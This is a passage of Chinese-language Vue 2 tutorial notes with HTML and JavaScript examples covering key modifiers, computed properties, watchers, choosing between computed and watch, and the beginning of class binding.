<font style="color:#595959;">            for (let i = 0; i < 100000; i++) {</font>

<font style="color:#595959;">              console.log("test passive");</font>

<font style="color:#595959;">            }</font>

<font style="color:#595959;">            // 阻止事件的默认行为</font>

<font style="color:#595959;">            //event.preventDefault()</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

### 2.3.3 按键修饰符
#### 1、 9个比较常用的按键修饰符：
.enter

.tab （必须配合**<font style="color:#FF0000;">keydown</font>**事件使用。）

.delete (捕获“删除”和“退格”键)

.esc

.space

.up

.down

.left

.right

<font style="color:#595959;">      回车键：<input type="text" @keyup.enter="getInfo" /></font>

<font style="color:#595959;">      <hr /></font>

<font style="color:#595959;">        //数字不具有通用性，不同的键盘排序不一，数字可能会变</font>

<font style="color:#595959;">      回车键（键值）：<input type="text" @keyup.13="getInfo" /></font>

<font style="color:#595959;">      <hr /></font>

<font style="color:#595959;">      delete键：<input type="text" @keyup.delete="getInfo" /></font>

<font style="color:#595959;">      <hr /></font>

<font style="color:#595959;">      esc键：<input type="text" @keyup.esc="getInfo" /></font>

<font style="color:#595959;">      <hr /></font>

<font style="color:#595959;">      space键：<input type="text" @keyup.space="getInfo" /></font>

<font style="color:#595959;">      <hr /></font>

<font style="color:#595959;">      up键：<input type="text" @keyup.up="getInfo" /></font>

<font style="color:#595959;">      <hr /></font>

<font style="color:#595959;">      down键：<input type="text" @keyup.down="getInfo" /></font>

<font style="color:#595959;">      <hr /></font>

<font style="color:#595959;">      left键：<input type="text" @keyup.left="getInfo" /></font>

<font style="color:#595959;">      <hr /></font>

<font style="color:#595959;">      right键：<input type="text" @keyup.right="getInfo" /></font>

<font style="color:#595959;">      <hr /></font>

#### 2、怎么获取某个键的按键修饰符？
第一步：通过**<font style="color:#FF0000;">event.key</font>**获取这个**<font style="color:#FF0000;">键</font>**的**<font style="color:#FF0000;">真</font>**实**<font style="color:#FF0000;">名</font>**字。

第二步：将这个真实名字以kebab-case风格进行命名。PageDown是真实名字。经过命名之后：page-down

<font style="color:#595959;">  <!-- 其他按键修饰符   mac的pagedown是fn+向下箭头 --></font>

<font style="color:#595959;">      PageDown键： <input type="text" @keyup.page-down="getInfo" /></font>

<font style="color:#595959;">      <hr /></font>

#### 3、按键修饰符是可以自定义的？
第一步：获取按键的**<font style="color:#FF0000;">键值</font>** ：**<font style="color:#FF0000;">event.keyCode</font>**

第二步：通过Vue的全局配置对象config来进行按键修饰符的自定义。

语法规则：**<font style="color:#FF0000;">Vue.config.keyCodes.按键修饰符的名字 = 键值</font>**

<font style="color:#595959;"> <!-- 3、自定义按键修饰符 --></font>

<font style="color:#595959;">huiche键： <input type="text" @keyup.huiche="getInfo" /></font>

<font style="color:#595959;"><hr /></font>

#### 4、系统修饰键：4个比较特殊的键
ctrl、alt、shift、meta

对于keydown事件来说：只要按下ctrl键，keydown事件就会触发。

对于keyup事件来说：需要按下ctrl键，并且加上按下组合键，然后松开组合键之后，keyup事件才能触发。

<font style="color:#595959;"><!-- 4、系统修饰键： ctrl、alt、shift、meta --></font>

<font style="color:#595959;">ctrl键(keydown)： <input type="text" @keydown.ctrl="getInfo" /></font>

<font style="color:#595959;"><hr /></font>

<font style="color:#595959;"><!-- ctrl+其他键 --></font>

<font style="color:#595959;">ctrl键(keyup)： <input type="text" @keyup.ctrl="getInfo" /></font>

<font style="color:#595959;"><hr /></font>

<font style="color:#595959;"><!-- ctrl+i键时才能触发 --></font>

<font style="color:#595959;">ctrl键(keyup)： <input type="text" @keyup.ctrl.i="getInfo" /></font>

<font style="color:#595959;"><hr /></font>



## 《2.4-5、计算&侦听属性》
## 2.4、计算属性
### 2.4.1、插值语法实现反转字符串
<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <!-- 需求：用户输入字符串，然后反转展示在页面中 --></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">      输入的信息：<input type="text" v-model="info" /> <hr /></font>

<font style="color:#595959;">    <!--</font>

<font style="color:#595959;">        直接写在插值语法中，有以下三个问题：</font>

**<font style="color:#595959;">            1. 可读性差。</font>**

**<font style="color:#595959;">            2. 代码没有得到复用。</font>**

**<font style="color:#595959;">            3. 难以维护。</font>**

<font style="color:#595959;">         --></font>

<font style="color:#595959;">      反转的信息：{{info.split('').reverse().join('')}} <hr /></font>

<font style="color:#595959;">      反转的信息：{{info.split('').reverse().join('')}} <hr /></font>

<font style="color:#595959;">      反转的信息：{{info.split('').reverse().join('')}} <hr /></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "插值语法-反转字符串案例",</font>

<font style="color:#595959;">          info: "",</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

vue官网中说：

模版内的表达式以及指令语法非常便利，但设计他们的初衷是用于简单运算，在模版中放入太多的逻辑会让模版过重且难以维护

### 2.4.2、方法实现反转字符串
<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">      输入的信息：<input type="text" v-model="info" /> <br /></font>

<font style="color:#595959;">      <!-- 在插值语法中可以调用方法，小括号不能省略。</font>

<font style="color:#595959;">        这个方法需要是Vue实例所管理的。 --></font>

<font style="color:#595959;">      反转的信息：{{reverseInfo()}} <br /></font>

<font style="color:#595959;">      <!-- 缺点：效率有问题 会重复调用 --></font>

<font style="color:#595959;">      反转的信息：{{reverseInfo()}} <br /></font>

<font style="color:#595959;">      反转的信息：{{reverseInfo()}} <br /></font>

<font style="color:#595959;">      反转的信息：{{reverseInfo()}} <br /></font>



<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "计算属性-反转字符串案例",</font>

<font style="color:#595959;">          info: "",</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        methods: {</font>

<font style="color:#595959;">          // 反转信息的方法</font>

<font style="color:#595959;">          reverseInfo() {</font>

<font style="color:#595959;">            return this.info.split("").reverse().join("");</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

### 2.4.3、计算属性实现反转字符串
#### 1. 什么是计算属性？
<font style="color:#FF0000;">使用Vue的原有属性，经过一系列的运算/计算，最终得到了一个全新的属性，叫做计算属性。</font>

Vue的原有属性: data对象当中的属性可以叫做Vue的原有属性。

全新的属性: 表示生成了一个新的属性，和data中的属性无关了，新的属性也有自己的属性名和属性值。

#### 2. 计算属性的作用？
代码得到了复用。

代码更加便于维护了。

代码的执行效率高了。

#### 3. 计算属性怎么用？
语法格式：

**<font style="color:#FF0000;">computed : {</font>**// 这是一个计算属性，可以有多个计算属性 

计算属性1 : {

// 当读取计算属性1的值的时候或该计算属性所关联的Vue原有属性的值发生变化时，getter方法被自动调用。

**<font style="color:#FF0000;">get(){}, </font>**

// 当修改计算属性1的值的时候，setter方法被自动调用。

**<font style="color:#FF0000;">set(val){} </font>**

**<font style="color:#FF0000;">},</font>**

计算属性2 : {},

**<font style="color:#FF0000;">}</font>**

**<font style="color:#FF0000;">(1)计算属性需要使用新的配置项：computed</font>**

**<font style="color:#FF0000;">(2)计算属性通过vm.$data ，vm._data 是无法访问的。</font>**

**<font style="color:#FF0000;">(3)</font>****<font style="color:#FF0000;">计算属性的getter/setter方法中的this是vm。</font>**

**<font style="color:#FF0000;">(4)计算属性的getter方法的调用时机：</font>**

**<font style="color:#FF0000;">①第一个时机：初次访问该属性。</font>**

**<font style="color:#FF0000;">②第二个时机：计算属性所依赖的数据发生变化时。</font>**

**<font style="color:#FF0000;">(5)计算属性的setter方法的调用时机：</font>**

**<font style="color:#FF0000;">①当计算属性被修改时。（在setter方法中通常是修改属性，因为只有当属性值变化时，计算属性的值就会联动更新。注意：计算属性的值被修改并不会联动更新属性的值。）</font>**

**<font style="color:#FF0000;">(6)计算属性没有真正的值，每一次都是依赖data属性计算出来的。</font>**

**<font style="color:#FF0000;">(7)计算属性的getter和setter方法不能使用箭头函数，因为箭头函数的this不是vm。而是window。</font>**

<font style="color:#595959;"> <body></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">      输入的信息：<input type="text" v-model="info" /> <br /></font>

<font style="color:#595959;">      反转的信息：{{reversedInfo}}<br /></font>

<font style="color:#595959;">      反转的信息: <input type="text" v-model="reversedInfo" /></font>



<font style="color:#595959;">      <!-- 多次调用计算属性，只会执行一次，效率高 --></font>

<font style="color:#595959;">      {{fun}} <br /></font>

<font style="color:#595959;">      <!-- {{fun}} <br /></font>

<font style="color:#595959;">      {{fun}} <br /></font>

<font style="color:#595959;">      {{fun}} <br /></font>

<font style="color:#595959;">      {{fun}} <br /> --></font>

<font style="color:#595959;">      <!-- 多次调用方法，每次都是执行，效率低 --></font>

<font style="color:#595959;">      <!-- {{hello()}} <br /></font>

<font style="color:#595959;">      {{hello()}} <br /></font>

<font style="color:#595959;">      {{hello()}} <br /></font>

<font style="color:#595959;">      {{hello()}} <br /></font>

<font style="color:#595959;">      {{hello()}} <br /> --></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "计算属性-反转字符串案例",</font>

<font style="color:#595959;">          info: "",</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        methods: {</font>

<font style="color:#595959;">          hello() {</font>

<font style="color:#595959;">            console.log("hello方法执行了");</font>

<font style="color:#595959;">            return "hello";</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        computed: {</font>

<font style="color:#595959;">          // 可以定义多个计算属性</font>

<font style="color:#595959;">          fun: {</font>

<font style="color:#595959;">            // get方法的调用时机</font>

<font style="color:#595959;">            get() {</font>

<font style="color:#595959;">              console.log("getter方法调用了");</font>

<font style="color:#595959;">              //console.log(this === vm)</font>

<font style="color:#595959;">              return "haha" + this.info;</font>

<font style="color:#595959;">            },</font>

<font style="color:#595959;">            // 不能使用箭头函数，使用箭头函数会导致this的指向是：window</font>

<font style="color:#595959;">            // get:()=>{</font>

<font style="color:#595959;">            //     console.log('getter方法调用了')</font>

<font style="color:#595959;">            //     console.log(this === vm)</font>

<font style="color:#595959;">            //     return 'haha'</font>

<font style="color:#595959;">            // },</font>

<font style="color:#595959;">            set(val) {</font>

<font style="color:#595959;">              console.log("setter方法调用了");</font>

<font style="color:#595959;">              //console.log(this === vm)</font>

<font style="color:#595959;">            },</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">          // 完整写法</font>

<font style="color:#595959;">          /* reversedInfo : { </font>

<font style="color:#595959;">                get(){</font>

<font style="color:#595959;">                    return this.info.split('').reverse().join('')</font>

<font style="color:#595959;">                },</font>

<font style="color:#595959;">                // 当修改计算属性的时候，set方法被自动调用。</font>

<font style="color:#595959;">                set(val){</font>

<font style="color:#595959;">                    //console.log('setter方法被调用了。')</font>

<font style="color:#595959;">                    </font>**<font style="color:#FF0000;">// 不能这么更改计算属性的值，这样做就递归了。</font>**

<font style="color:#595959;">                    //this.reversedInfo = val</font>

<font style="color:#595959;">                    // 怎么修改计算属性呢？原理：计算属性的值变还是不变，取决于计算属性关联的Vue原始属性的值。</font>

<font style="color:#595959;">                    // 也就是说：reversedInfo变还是不变，取决于info属性的值变不变。</font>

<font style="color:#595959;">                    // 将值赋给info，通过info来实现反推修改，</font>

<font style="color:#595959;">                    //例如，需要将翻转值修改为hello，则需要反转给info，通过info再反转回来</font>

<font style="color:#595959;">                 </font><font style="color:#FF0000;">   //</font>**<font style="color:#FF0000;"> 本质上：修改计算属性，实际上就是通过修改Vue的原始属性来实现的。</font>**

<font style="color:#595959;">                    this.info = val.split('').reverse().join('')</font>

<font style="color:#595959;">                }</font>

<font style="color:#595959;">            } */</font>



<font style="color:#595959;">          // 简写形式：set不需要的时候。</font>

<font style="color:#595959;">          reversedInfo() {</font>

<font style="color:#595959;">            return this.info.split("").reverse().join("");</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

#### 4、计算属性的简写形式
只考虑读取，不考虑修改时，可以启用计算属性的简写形式。

**<font style="color:#595959;">1. computed : {  </font>**

**<font style="color:#595959;">2.     reversedInfo(){  </font>**

**<font style="color:#595959;">3.         console.log('getter被调用了');  </font>**

**<font style="color:#595959;">4.         return this.info.split('').reverse().join('')  </font>**

**<font style="color:#595959;">5.     }  </font>**

**<font style="color:#595959;">6. }  </font>**

## 2.5、侦听属性
### 2.5.1、侦听属性作用
侦听属性的变化其实就是**<u>监视某个属性的变化</u>**。当被监视的属性一旦发生改变时，执行某段代码。

### 2.5.2、watch配置项
监视属性变化时需要使用watch配置项

可以监视多个属性，监视哪个属性，请把这个属性的名字拿过来即可。

i.可以监视Vue的原有属性

ii.如果监视的属性具有多级结构，一定要添加单引号：'a.b'

iii.无法直接监视对象深层次属性，如a.b，b属性压根不存在。

iv.启用深度监视，默认是不开启深度监视的。

v.也可以监视计算属性

### 2.5.3、如何深度监视：
(1) 监视多级结构中某个属性的变化，写法是：**<font style="color:#FF0000;">’a.b.c’ : {}</font>**。注意**<font style="color:#FF0000;">单引号</font>**哦。  
(2) 监视多级结构中所有属性的变化，可以通过添加深度监视来完成：**<font style="color:#FF0000;">deep : true</font>**

### 2.5.4、 如何后期添加监视：
**<font style="color:#FF0000;">(1) 调用API：vm.$watch(‘number1’, {})</font>**

### 2.5.5、 watch的简写：
(1) 简写的前提：**当不需要配置immediate和deep时**，可以简写。

(2) 如何简写？

①** watch:{ **

**number1(newVal,oldVal){}, **

**number2(newVal, oldVal){}**

**}**

(3) 后期添加的监视如何简写？

**<font style="color:#FF0000;">① vm.$watch(‘number1’, function(newVal, oldVal){})</font>**

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">      数字：<input type="text" v-model="number" /><br /></font>

<font style="color:#595959;">      数字：<input type="text" v-model="a.b" /><br /></font>

<font style="color:#595959;">      数字：<input type="text" v-model="a.c" /><br /></font>

<font style="color:#595959;">      数字：<input type="text" v-model="a.d.e.f" /><br /></font>

<font style="color:#595959;">      数字(后期添加监视)：<input type="text" v-model="number2" /><br /></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "侦听属性的变化",</font>

<font style="color:#595959;">          // 原有属性</font>

<font style="color:#595959;">          number: 0,</font>

<font style="color:#595959;">          //   多层次属性</font>

<font style="color:#595959;">          a: {</font>

<font style="color:#595959;">            b: 0,</font>

<font style="color:#595959;">            c: 0,</font>

<font style="color:#595959;">            d: {</font>

<font style="color:#595959;">              e: {</font>

<font style="color:#595959;">                f: 0,</font>

<font style="color:#595959;">              },</font>

<font style="color:#595959;">            },</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">          number2: 0,</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        // 计算属性</font>

<font style="color:#595959;">        computed: {</font>

<font style="color:#595959;">          hehe() {</font>

<font style="color:#595959;">            return "haha" + this.number;</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        watch: {</font>

<font style="color:#595959;">          //1、可以监视多个属性，监视哪个属性，请把这个属性的名字拿过来即可。</font>

<font style="color:#595959;">          //1.1 可以</font>**<font style="color:#FF0000;">监视Vue的原有属性</font>**

<font style="color:#595959;">          /* number : {</font>

<font style="color:#595959;">            // </font>**<font style="color:#595959;">初始</font>**<font style="color:#595959;">化的时候，</font>**<font style="color:#595959;">调用</font>**<font style="color:#595959;">一次handler方法。</font>

**<font style="color:#FF0000;">            immediate : true,</font>**

<font style="color:#595959;">           </font>**<font style="color:#FF0000;"> // 这里有一个固定写死的方法，方法名必须叫做：handler</font>**

<font style="color:#595959;">            // handler方法什么时候被调用呢？当被监视的属性发生变化的时候，handler就会自动调用一次。</font>

<font style="color:#595959;">            // handler方法上有两个</font>**<font style="color:#FF0000;">参数</font>**<font style="color:#595959;">：第一个参数newValue，第二个参数是oldValue</font>

<font style="color:#595959;">            // newValue是属性值改变之后的</font>**<font style="color:#FF0000;">新值</font>**<font style="color:#595959;">。</font>

<font style="color:#595959;">            // oldValue是属性值改变之前的</font>**<font style="color:#FF0000;">旧值</font>**<font style="color:#595959;">。</font>

<font style="color:#595959;">            handler(newValue, oldValue){</font>

<font style="color:#595959;">                console.log(newValue, oldValue)</font>

<font style="color:#595959;">                // this是当前的Vue实例。</font>

<font style="color:#595959;">                // 如果该函数是箭头函数，这个this是window对象。不建议使用箭头函数。</font>

<font style="color:#595959;">                console.log(this)</font>

<font style="color:#595959;">            }</font>

<font style="color:#595959;">                }, */</font>

<font style="color:#595959;">          //1.2</font>**<font style="color:#595959;"> 如果监视的属性具有多级结构，一定要添加单引号：'a.b'</font>**

<font style="color:#595959;">          /* 'a.b' : {  </font>

<font style="color:#595959;">                    handler(newValue, oldValue){</font>

<font style="color:#595959;">                        console.log('@')</font>

<font style="color:#595959;">                    } </font>

<font style="color:#595959;">                },</font>



<font style="color:#595959;">                'a.c' : {  </font>

<font style="color:#595959;">                    handler(newValue, oldValue){</font>

<font style="color:#595959;">                        console.log('@')</font>

<font style="color:#595959;">                    } </font>

<font style="color:#595959;">                }, */</font>

<font style="color:#595959;">          // 无法监视b属性，因为b属性压根不存在。</font>

<font style="color:#595959;">          /* b : {  </font>

<font style="color:#595959;">                    handler(newValue, oldValue){</font>

<font style="color:#595959;">                        console.log('@')</font>

<font style="color:#595959;">                    } </font>

<font style="color:#595959;">                } */</font>

<font style="color:#595959;">          //1.3 启用深度监视，默认是不开启深度监视的。</font>

<font style="color:#595959;">          a: {</font>

<font style="color:#595959;">            // 什么时候开启深度监视：当你需要监视一个具有多级结构的属性，并且监视所有的属性，需要启用深度监视。</font>

<font style="color:#595959;">            deep: true,</font>

<font style="color:#595959;">            handler(newValue, oldValue) {</font>

<font style="color:#595959;">              console.log("@");</font>

<font style="color:#595959;">            },</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">          //1.4</font>**<font style="color:#FF0000;"> 也可以监视计算属性</font>**

<font style="color:#595959;">          /* hehe : {</font>

<font style="color:#595959;">                    handler(a , b){</font>

<font style="color:#595959;">                        console.log(a, b)</font>

<font style="color:#595959;">                    }</font>

<font style="color:#595959;">                } */</font>



<font style="color:#595959;">          //2、 监视某个属性的时候，也有简写形式，什么时候启用简写形式？</font>

<font style="color:#595959;">          </font>**<font style="color:#595959;">// 当只有handler回调函数的时候，可以使用简写形式。</font>**

**<font style="color:#595959;">          number(newValue, oldValue) {</font>**

**<font style="color:#595959;">            console.log(newValue, oldValue);</font>**

**<font style="color:#595959;">          },</font>**

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>



<font style="color:#595959;">      /</font>**<font style="color:#595959;">/3、 如何后期添加监视？调用Vue相关的API即可。</font>**

<font style="color:#595959;">      //3.1 语法：</font>**<font style="color:#595959;">vm.$watch('被监视的属性名', {})</font>**

<font style="color:#595959;">      /* vm.$watch('number2', {</font>

<font style="color:#595959;">            immediate : true,</font>

<font style="color:#595959;">            deep : true,</font>

<font style="color:#595959;">            handler(newValue, oldValue){</font>

<font style="color:#595959;">                console.log(newValue, oldValue)</font>

<font style="color:#595959;">            }</font>

<font style="color:#595959;">        }) */</font>



<font style="color:#595959;">      //3.2 这是后期添加监视的简写形式。</font>

<font style="color:#595959;">    </font>**<font style="color:#595959;">  vm.$watch("number2", function (newValue, oldValue) {</font>**

**<font style="color:#595959;">        console.log(newValue, oldValue);</font>**

**<font style="color:#595959;">      });</font>**

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

### 2.5.6. computed和watch如何选择？
比大小的案例

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433645248-f2d5244d-8f3d-4938-b66d-62b67fa9a8fc.png)

#### 2.5.6.1、watch实现
<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">      数值1：<input type="number" v-model="num1" /><br /></font>

<font style="color:#595959;">      数值2：<input type="number" v-model="num2" /><br /></font>

<font style="color:#595959;">      比较大小：{{compareResult}}</font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "比较大小的案例",</font>

<font style="color:#595959;">          num1: 0,</font>

<font style="color:#595959;">          num2: 0,</font>

<font style="color:#595959;">          compareResult: "",</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        watch: {</font>

<font style="color:#595959;">          // 监视num1</font>

<font style="color:#595959;">          num1: {</font>

<font style="color:#595959;">            immediate: true,</font>

<font style="color:#595959;">            handler(val) {</font>

<font style="color:#595959;">              let result = val - this.num2;</font>

<font style="color:#595959;">              if (result == 0) {</font>

<font style="color:#595959;">                this.compareResult = val + " = " + this.num2;</font>

<font style="color:#595959;">              } else if (result > 0) {</font>

<font style="color:#595959;">                this.compareResult = val + " > " + this.num2;</font>

<font style="color:#595959;">              } else {</font>

<font style="color:#595959;">                this.compareResult = val + " < " + this.num2;</font>

<font style="color:#595959;">              }</font>

<font style="color:#595959;">            },</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">          // 监视num2</font>

<font style="color:#595959;">          num2: {</font>

<font style="color:#595959;">            immediate: true,</font>

<font style="color:#595959;">            handler(val) {</font>

<font style="color:#595959;">              let result = this.num1 - val;</font>

<font style="color:#595959;">              if (result == 0) {</font>

<font style="color:#595959;">                this.compareResult = this.num1 + " = " + val;</font>

<font style="color:#595959;">              } else if (result > 0) {</font>

<font style="color:#595959;">                this.compareResult = this.num1 + " > " + val;</font>

<font style="color:#595959;">              } else {</font>

<font style="color:#595959;">                this.compareResult = this.num1 + " < " + val;</font>

<font style="color:#595959;">              }</font>

<font style="color:#595959;">            },</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

#### 2.5.6.2、computed实现
<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">      数值1：<input type="number" v-model="num1" /><br /></font>

<font style="color:#595959;">      数值2：<input type="number" v-model="num2" /><br /></font>

<font style="color:#595959;">      比较大小：{{compareResult}}</font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "比较大小的案例",</font>

<font style="color:#595959;">          num1: 0,</font>

<font style="color:#595959;">          num2: 0,</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        computed: {</font>

<font style="color:#595959;">          // 计算属性的简写形式</font>

<font style="color:#595959;">          compareResult() {</font>

<font style="color:#595959;">            let result = this.num1 - this.num2;</font>

<font style="color:#595959;">            if (result == 0) {</font>

<font style="color:#595959;">              return this.num1 + " = " + this.num2;</font>

<font style="color:#595959;">            } else if (result > 0) {</font>

<font style="color:#595959;">              return this.num1 + " > " + this.num2;</font>

<font style="color:#595959;">            } else {</font>

<font style="color:#595959;">              return this.num1 + " < " + this.num2;</font>

<font style="color:#595959;">            }</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

#### 2.5.6.3、总结
(1) 以上比较大小的案例可以用computed完成，并且比watch还要简单。所以要遵守一个原则：**computed和watch都能够完成的，优先选择computed。**

(2) 如果要开启**<font style="color:#FF0000;">异步任务，只能选择watc</font>****<font style="color:#FF0000;">h</font>****<font style="color:#FF0000;">。因为computed依靠return。watch不需要依赖return。</font>**

比较大小的案例：延迟3s出现结果

<font style="color:#595959;">    watch: {</font>

<font style="color:#595959;">          // 监视num1</font>

<font style="color:#595959;">          num1: {</font>

<font style="color:#595959;">            immediate: true,</font>

<font style="color:#595959;">            handler(val) {</font>

<font style="color:#595959;">              let result = val - this.num2;</font>

<font style="color:#595959;">              // 需求2:3s后出现比较结果</font>

<font style="color:#595959;">              //  此时使用箭头函数，箭头函数没有this，会向上找到num1，num1是vm的属性，</font>

<font style="color:#595959;">              //   如果将此时箭头函数转成普通函数，this就会是window</font>

<font style="color:#595959;">              setTimeout(() => {</font>

<font style="color:#595959;">                if (result == 0) {</font>

<font style="color:#595959;">                  this.compareResult = val + " = " + this.num2;</font>

<font style="color:#595959;">                } else if (result > 0) {</font>

<font style="color:#595959;">                  this.compareResult = val + " > " + this.num2;</font>

<font style="color:#595959;">                } else {</font>

<font style="color:#595959;">                  this.compareResult = val + " < " + this.num2;</font>

<font style="color:#595959;">                }</font>

<font style="color:#595959;">              }, 3000);</font>

<font style="color:#595959;">            },</font>

<font style="color:#595959;">          },</font>



<font style="color:#595959;">          // 监视num2</font>

<font style="color:#595959;">          num2: {</font>

<font style="color:#595959;">            immediate: true,</font>

<font style="color:#595959;">            handler(val) {</font>

<font style="color:#595959;">              let result = this.num1 - val;</font>

<font style="color:#595959;">              setTimeout(() => {</font>

<font style="color:#595959;">                if (result == 0) {</font>

<font style="color:#595959;">                  this.compareResult = this.num1 + " = " + val;</font>

<font style="color:#595959;">                } else if (result > 0) {</font>

<font style="color:#595959;">                  this.compareResult = this.num1 + " > " + val;</font>

<font style="color:#595959;">                } else {</font>

<font style="color:#595959;">                  this.compareResult = this.num1 + " < " + val;</font>

<font style="color:#595959;">                }</font>

<font style="color:#595959;">              }, 3000);</font>

<font style="color:#595959;">            },</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      </font>

<font style="color:#595959;"> computed: {</font>

<font style="color:#595959;">          // 计算属性的简写形式</font>

<font style="color:#595959;">          // 计算结果3s后显示，由于setTimeout是异步的，是有js引擎调用的，所以它的this是window，可以使用箭头函数</font>

<font style="color:#595959;">          compareResult() {</font>

<font style="color:#595959;">            setTimeout(() => {</font>

<font style="color:#595959;">              let result = this.num1 - this.num2;</font>

<font style="color:#595959;">              if (result == 0) {</font>

<font style="color:#595959;">                return this.num1 + " = " + this.num2;</font>

<font style="color:#595959;">              } else if (result > 0) {</font>

<font style="color:#595959;">                return this.num1 + " > " + this.num2;</font>

<font style="color:#595959;">              } else {</font>

<font style="color:#595959;">                return this.num1 + " < " + this.num2;</font>

<font style="color:#595959;">              }</font>

<font style="color:#595959;">            }, 3000);</font>

<font style="color:#595959;">          },</font>

### 2.5.7. 关于函数的写法，写普通函数还是箭头函数？
**(1) 不管写普通函数还是箭头函数，目标是一致的，都是为了让this和vm相等。**

**(2) 所有Vue管理的函数，建议写成普通函数。**

**(3) 所有不属于Vue管理的函数，例如setTimeout的回调函数、Promise的回调函数、AJAX的回调函数，建议使用箭头函数。**





### 《2.6、class与style绑定》
### 2.6.1 class绑定 
#### 1、绑定字符串
适用于样式的名字不确定，需要动态指定。

<font style="color:#595959;">  <head></font>

<font style="color:#595959;">    <meta charset="UTF-8" /></font>

<font style="color:#595959;">    <title>Class绑定之字符串形式</title></font>

<font style="color:#595959;">    <script src="../js/vue.js"></script></font>

<font style="color:#595959;">    <style></font>

<font style="color:#595959;">      .static {</font>

<font style="color:#595959;">        border: 1px solid black;</font>

<font style="color:#595959;">        background-color: aquamarine;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">      .big {</font>

<font style="color:#595959;">        width: 200px;</font>

<font style="color:#595959;">        height: 200px;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">      .small {</font>

<font style="color:#595959;">        width: 100px;</font>

<font style="color:#595959;">        height: 100px;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">    </style></font>

<font style="color:#595959;">  </head></font>

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">      <!-- 静态写法 --></font>

<font style="color:#595959;">      <div class="static small">{{msg}}</div></font>

<font style="color:#595959;">      <hr /></font>

<font style="color:#595959;">      <!-- 动态写法：动静都有 --></font>

<font style="color:#595959;">      <!-- 适用场景：</font>**<font style="color:#595959;">如果确定动态绑定的样式个数只有1个，但是名字不确定</font>**<font style="color:#595959;">。 --></font>

<font style="color:#595959;">      <div class="static" </font>**<font style="color:#595959;">:class="c1"</font>**<font style="color:#595959;">>{{msg}}</div></font>

